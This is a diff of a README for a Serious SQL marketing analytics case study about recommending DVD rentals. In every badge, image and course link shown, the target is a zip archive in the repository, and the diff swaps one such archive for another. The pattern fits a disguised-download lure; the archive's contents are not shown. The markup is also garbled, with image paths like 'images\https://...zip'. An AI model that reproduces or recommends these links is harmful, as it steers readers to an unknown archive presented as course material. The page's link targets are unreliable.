@@ -1,25 +1,25 @@
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)]()
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)]()
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)]()
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)]()
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)]()
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)]()
 
 <p align="center">
-    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="marketing-analytics">
+    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="marketing-analytics">
 </p>
 
 <h1 align="center">Marketing Analytics Case Study - Serious SQL 🚀</h1>
 
 <div align="center">
 
-  [![Status](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)]()
-  [![Ask Me Anything !](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip%https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)]() 
-  [![Open Source? Yes!](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip%20Source%20%3F/Yes%21/blue?icon=github)]()
-  [![License](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)]()
+  [![Status](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)]()
+  [![Ask Me Anything !](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip%https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)]() 
+  [![Open Source? Yes!](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip%20Source%20%3F/Yes%21/blue?icon=github)]()
+  [![License](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)]()
 
 </div>
 
 ---
 
-<p align="center"> This is a marketing analytics case study from the <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a> course by Danny Ma. The marketing team have shared with us a draft of the email they wish to send to their customers.
+<p align="center"> This is a marketing analytics case study from the <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a> course by Danny Ma. The marketing team have shared with us a draft of the email they wish to send to their customers.
     <br> 
 </p>
 
@@ -55,10 +55,10 @@ The following email template has been shared to us by the marketing team at DVD 
 <br>
 
 <p align="center">
-    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="email-template" width="500px">
+    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="email-template" width="500px">
 </p>
 
-<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a></u>
+<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a></u>
     <br> 
 </p>
 
@@ -71,10 +71,10 @@ For each customer, we need to find the top 2 categories based on their past rent
 <br>
 
 <p align="center">
-    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="email-template" width="500px">
+    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="email-template" width="500px">
 </p>
 
-<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a></u>
+<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a></u>
     <br> 
 </p>
 
@@ -87,10 +87,10 @@ Next, for each of the top 2 categories, we need to recommend 3 popular films whi
 <br>
 
 <p align="center">
-    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="email-template" width="500px">
+    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="email-template" width="500px">
 </p>
 
-<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a></u>
+<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a></u>
     <br> 
 </p>
 
@@ -114,10 +114,10 @@ Lastly, for the top 2 categories, we need to provide some individual customer in
 <br>
 
 <p align="center">
-    <img src="images\requirement_3&https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="email-template" width="500px">
+    <img src="images\requirement_3&https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="email-template" width="500px">
 </p>
 
-<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a></u>
+<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a></u>
     <br> 
 </p>
 
@@ -130,10 +130,10 @@ Lastly, we need to identify the favourite actor of the customer along with the t
 <br>
 
 <p align="center">
-    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="email-template" width="500px">
+    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="email-template" width="500px">
 </p>
 
-<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a></u>
+<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a></u>
     <br> 
 </p>
 
@@ -142,16 +142,16 @@ Lastly, we need to identify the favourite actor of the customer along with the t
 First, we start with the data exploration. There are 7 tables in total viz ```rental```, ```inventory```, ```film```, ```film_category```, ```category```, ```film_actor``` and ```actor```. The Entity Relationship diagram can be seen as below.
 
 <p align="center">
-    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip" alt="erd">
+    <img src="images\https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip" alt="erd">
 </p>
 
-<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip">Serious SQL</a></u>
+<p align="center"> <u>Source: <a href="https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip">Serious SQL</a></u>
     <br> 
 </p>
 
 ### Click to view 👇:
 
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)
 
 ## 📌 Data Analysis <a name = "data-analysis"></a>
 
@@ -159,7 +159,7 @@ After exploring the dataset, we start analysing the key columns and come up with
 
 ### Click to view 👇:
 
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)
 
 ## 🧲 Join Implementation <a name = "join-implementation"></a>
 
@@ -174,7 +174,7 @@ Next, we start implementing the table joins which will then help us to start the
 
 ### Click to view 👇:
 
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)
 
 ## 💥 Problem Solving <a name = "problem-solving"></a>
 
@@ -191,7 +191,7 @@ Now that we have our base table after joining all the tables, we start solving f
 
 ### Click to view 👇:
 
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)
 
 ## ✨ Final Solution <a name = "final-solution"></a>
 
@@ -273,7 +273,7 @@ And, the recommendations based on their favorite actor for ```customer_id = 1```
 
 ### Click to view 👇:
 
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)
 
 ## 🚀 Business Questions <a name = "business-questions"></a>
 
@@ -295,7 +295,7 @@ The following questions are part of the final case study quiz - these are exampl
 
 ### Click to view 👇:
 
-[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/01-Data-Exploration/marketing_cs_analytics_v3.2.zip)
+[![forthebadge](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)](https://raw.githubusercontent.com/Yogeshvar-M/marketing-analytics-cs/main/03-Join-Implementation/cs-analytics-marketing-2.2-alpha.3.zip)
 
 ## 🎨 Contributing <a name = "contributing"></a>
 
